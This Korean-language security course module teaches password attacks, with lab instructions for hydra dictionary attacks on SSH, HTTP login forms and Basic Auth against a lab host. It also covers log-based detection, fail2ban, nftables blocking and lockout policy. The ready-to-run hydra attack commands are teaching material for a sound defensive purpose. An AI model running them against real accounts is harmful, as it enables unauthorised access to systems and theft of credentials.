# Week 04: 패스워드 공격 — Brute Force, Dictionary, hydra

## 학습 목표
- 패스워드 공격의 유형과 원리를 이해한다
- hydra를 사용하여 SSH, HTTP 서비스에 대한 패스워드 공격을 수행할 수 있다
- Dictionary 공격과 Brute Force 공격의 차이를 구분하고 적절히 선택할 수 있다
- 패스워드 공격에 대한 방어 기법을 구현할 수 있다

## 선수 지식
- 리눅스 사용자 인증 체계 (/etc/passwd, /etc/shadow)
- SSH 접속 방법
- HTTP 기본 인증(Basic Auth) 개념

## 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | 패스워드 공격 이론 | 강의 |
| 0:30-0:50 | hydra 및 워드리스트 도구 소개 | 강의 |
| 0:50-1:00 | 휴식 | - |
| 1:00-1:40 | SSH 패스워드 공격 실습 | 실습 |
| 1:40-2:20 | HTTP 로그인 공격 실습 | 실습 |
| 2:20-2:30 | 휴식 | - |
| 2:30-3:10 | 방어 기법 구현 실습 | 실습 |
| 3:10-3:40 | 토론 + 퀴즈 | 토론/퀴즈 |

---

# Part 1: 패스워드 공격 이론 (30분)

## 1.1 패스워드 공격의 유형

패스워드 공격은 MITRE ATT&CK에서 **T1110 (Brute Force)** 기법에 해당하며, 4가지 하위 기법으로 분류된다.

### 공격 유형 비교

| 유형 | 방식 | 속도 | 성공률 | 예시 |
|------|------|------|--------|------|
| **Brute Force** | 모든 조합 시도 | 매우 느림 | 이론상 100% | aaaa → aaab → aaac... |
| **Dictionary** | 사전 파일 기반 | 빠름 | 사전 의존 | password, 123456, admin... |
| **Credential Stuffing** | 유출 계정 재사용 | 빠름 | 높음 (재사용 시) | 타 사이트 유출 DB 활용 |
| **Password Spraying** | 소수 패스워드로 다수 계정 | 중간 | 중간 | admin/Password1 전체 시도 |

## 1.2 워드리스트(Wordlist)

패스워드 공격의 성공률은 워드리스트의 품질에 크게 좌우된다.

### 주요 워드리스트

| 이름 | 크기 | 용도 |
|------|------|------|
| `rockyou.txt` | 14M 엔트리 | 범용 (가장 많이 사용) |
| `common-passwords.txt` | 1K 엔트리 | 빠른 테스트 |
| `darkweb2017-top10000.txt` | 10K 엔트리 | 실제 유출 기반 |

```
# 통계: 가장 많이 사용되는 패스워드 (rockyou.txt 기준)
1. 123456      (290만 건)
2. 12345       (80만 건)
3. 123456789   (70만 건)
4. password    (60만 건)
5. iloveyou    (40만 건)
```

## 1.3 패스워드 해시와 크래킹

리눅스 시스템에서 패스워드는 `/etc/shadow`에 해시로 저장된다.

```
$6$rounds=5000$salt$hash...
 │  │           │    └── 해시 값
 │  │           └── 솔트 (무작위 문자열)
 │  └── 라운드 수
 └── 해시 알고리즘 (6=SHA-512, 5=SHA-256, y=yescrypt)
```

---

# Part 2: 실습 가이드

## 실습 2.1: hydra를 이용한 SSH 패스워드 공격

> **목적**: 취약한 SSH 계정에 대한 Dictionary 공격을 수행한다
> **배우는 것**: hydra 사용법, 워드리스트 준비, 공격 결과 해석

```bash
# 워드리스트 준비 (테스트용 소규모)
cat > /tmp/users.txt << 'EOF'
admin
root
user
test
guest
EOF

cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
root
test123
password123
EOF

# hydra SSH 공격 (단일 사용자)
hydra -l admin -P /tmp/passwords.txt ssh://10.20.30.80 -t 4

# hydra SSH 공격 (다수 사용자)
hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://10.20.30.80 -t 4

# 상세 출력 모드
hydra -l admin -P /tmp/passwords.txt ssh://10.20.30.80 -t 4 -V

# 결과를 파일로 저장
hydra -l admin -P /tmp/passwords.txt ssh://10.20.30.80 -t 4 -o /tmp/hydra_result.txt
```

> **결과 해석**: `[22][ssh]` 다음에 `host: IP login: 사용자 password: 패스워드`가 표시되면 성공이다. `-t 4`는 동시 4개 스레드로 제한하여 서비스 과부하를 방지한다.
> **실전 활용**: 공방전에서 SSH가 열려있고 약한 패스워드가 설정된 경우 빠르게 접근 권한을 획득할 수 있다.

## 실습 2.2: HTTP 로그인 공격

> **목적**: 웹 로그인 폼에 대한 패스워드 공격을 수행한다
> **배우는 것**: HTTP POST 기반 공격, 실패/성공 조건 설정

```bash
# HTTP POST 폼 공격 (JuiceShop)
hydra -l admin@juice-sh.op -P /tmp/passwords.txt \
  10.20.30.80 http-post-form \
  "/rest/user/login:email=^USER^&password=^PASS^:Invalid email or password" \
  -s 3000 -t 4

# HTTP Basic Auth 공격
hydra -L /tmp/users.txt -P /tmp/passwords.txt \
  10.20.30.80 http-get / -t 4

# 진행 상황 표시
hydra -l admin -P /tmp/passwords.txt \
  10.20.30.80 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed" \
  -t 4 -V -f
```

> **결과 해석**: `-f` 옵션은 첫 번째 성공 시 중단한다. 실패 조건 문자열이 응답에 없으면 성공으로 판단한다.

## 실습 2.3: 방어 기법 구현

> **목적**: 패스워드 공격을 탐지하고 차단하는 방법을 구현한다
> **배우는 것**: fail2ban 설정, 로그 모니터링

```bash
# SSH 로그인 실패 로그 확인
grep "Failed password" /var/log/auth.log | tail -20

# 실패 IP 통계
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# fail2ban 상태 확인
sudo fail2ban-client status sshd

# nftables로 특정 IP 차단
sudo nft add rule inet filter input ip saddr 10.20.30.99 drop
```

> **결과 해석**: 짧은 시간 내 다수의 로그인 실패가 같은 IP에서 발생하면 패스워드 공격이다. fail2ban은 이를 자동으로 탐지하고 차단한다.

---

# Part 3: 심화 학습

## 3.1 패스워드 정책 강화

강력한 패스워드 정책은 패스워드 공격의 가장 효과적인 방어이다.

- 최소 12자 이상, 대/소문자 + 숫자 + 특수문자 조합
- 이전 패스워드 재사용 금지
- 주기적 변경보다 길고 복잡한 패스워드 권장
- MFA(Multi-Factor Authentication) 도입

## 3.2 계정 잠금 정책

```bash
# PAM 설정으로 5회 실패 시 10분 잠금
# /etc/pam.d/common-auth에 추가
auth required pam_tally2.so deny=5 unlock_time=600
```

---

## 검증 체크리스트
- [ ] hydra로 SSH 서비스에 대한 Dictionary 공격을 성공적으로 수행했는가
- [ ] HTTP 로그인 폼에 대한 패스워드 공격을 수행했는가
- [ ] 로그에서 패스워드 공격 흔적을 식별했는가
- [ ] fail2ban 또는 nftables로 공격 IP를 차단했는가

## 자가 점검 퀴즈
1. Dictionary 공격과 Brute Force 공격의 장단점을 비교하라.
2. Password Spraying이 계정 잠금 정책을 우회할 수 있는 이유는?
3. hydra에서 `-t 4` 옵션의 의미와 적정 값을 설명하라.
4. /etc/shadow 파일의 `$6$` 접두사가 의미하는 해시 알고리즘은?
5. fail2ban이 동작하는 원리를 3단계로 설명하라.
